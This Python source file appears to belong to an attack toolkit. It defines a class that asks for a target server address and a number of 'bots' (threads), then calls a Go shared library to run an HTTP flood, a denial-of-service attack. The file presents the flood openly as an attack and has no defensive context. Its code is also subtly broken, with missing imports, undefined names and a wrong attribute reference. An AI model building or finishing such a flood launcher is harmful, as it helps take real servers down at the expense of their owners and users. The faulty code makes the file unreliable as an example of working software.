"""
@author: azseza
HTTP flood attack declared in go file as a shared library
"""
from ctypes import *
import multiprocessing


class HttpGoFood(multiprocessing.Process):
    """
    The golang httpFlood attack lunch
    """
    gofile = "httpflood.so"
    lib_name = "mainer"

    def __init__(self):
        multiprocessing.Process.__init__(self)
        self.target = ""
        self.numberOfBots = 50

    def setConf(self):
        questions = [
            {
                'type': 'input',
                'name': 'target',
                'message': 'Target Server Adress',
                'validate': TargetValidator
            },
            {
                'type': 'input',
                'name': 'nob',
                'message': 'Number of Bots (Threads)',
                'validate': IntValidator
            }
        ]
        answers = prompt(questions, style=style)
        self.target = answers.get("target")
        self.numberOfBots = answers.get("nob")

    def run(self):
        try:
            file = pathlib.Path(gofile)
            if file.exists():
                lib = cdll.LoadLibrary('./httpflood.so')
                lib(self.target, self.numberOfBots)
            else:
                raise FileNotFoundError
        except BrokenGoFile:
            log("something went wrong with the Go interpreter", color="red")
        except FileNotFoundError:
            log("Did You make the project ? Go executable not found!", color="red")
        except NameError:
            log("Go object shared library not found, Did You make the project ? ", color="red")

